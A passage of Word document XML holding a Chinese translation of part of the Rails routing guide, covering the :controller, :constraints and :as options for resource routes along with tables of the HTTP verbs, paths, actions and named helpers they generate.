            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "images"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78735EA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它将会接收 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">开头的路径然后匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Images</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器上：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2136"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="2616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="37293614" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D044F4A"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2962C37E"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CF28B1F"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0FCFEFA5"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named helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="26751B0D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="430C6C6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4EA70AF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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="795CD9B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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A18DA2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photos_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0E984706" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="759B8D5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6B898D8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/photos/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="170869B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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38CC3EF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new_photo_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4C0C401C" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02E97AF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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="521FEC2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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DB3E03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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68ACE64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photos_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3ED18FAB" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D04631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7C5A38E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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C46D88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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="34EE8E3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photo_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2740FCB9" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="088170D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68D3645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/photos/:id/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10BC3A5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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2016D6F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edit_photo_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="272C99D0" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="032C13E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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D03944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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D5D279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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19C49FA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photo_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="60D77428" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75158E7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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="570827A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/photos/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EE60E3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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0ABBC73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photo_path(:id) </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="44900C2E"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使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photos_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new_photo_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,等等 生成路径到这个 resource 上。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65301EE5"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4.2 指定限制：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021E1D6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你可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:constraints</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来限定 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的格式。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7656"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="225D141E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="585A7C3D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1420369985"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :constraints</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; {:id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /[A-Z][A-Z][0-9]+/}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67D9993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这个声明限制了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 必须与参数里的正则匹配。所以，在这个例子里，路由将不再匹配 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/1</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，而只有 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/RR27</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的才会被匹配。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D7B66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你可以用一个代码块来把单个正则限制运用到多条规则上去。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7F150955" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B7DB56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constraints(:id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /[A-Z][A-Z][0-9]+/) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50A539C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:photos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DA5C5B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:accounts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B9F734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6513ECBA"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当然，你也可以像在 非resourceful 路由规则中运用正则一样在这里使用各种高级的正则或限定技巧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486D764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默认情况下 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数不接收 点 ———— 这是因为 点已经被用作了格式分割符。如果你需要在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的正则中匹配出 点，你需要这样复写正则表达式，例如：</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> =&gt; /[^\/]+/ ，这样会允许除了斜杠之外的任何字符。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A608D44"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4.3 覆盖 命名（Named） Helper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5518380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:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项能让你把默认命名的路由 Helper 重命名成定制的字符串。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="551880D9" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D295116" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="967200862"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :photos, :as</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "images"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2813E61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这将会把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 相关的路由请求匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，但是产生的 Helper 却是 :as 选项中的值。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2136"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="2616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="13BB49FB" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E6ED15B"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HTTP verb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C625119"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02CDF90A"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32D796A7"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named helper </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6F049545" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1311ED5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31CADD3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 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E94C90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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CF06FF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images_path </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6C9C06E7" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DDF74E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209466B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/photos/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78350EB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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2682379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new_image_path </w:t>
            </w:r>
          </w:p>
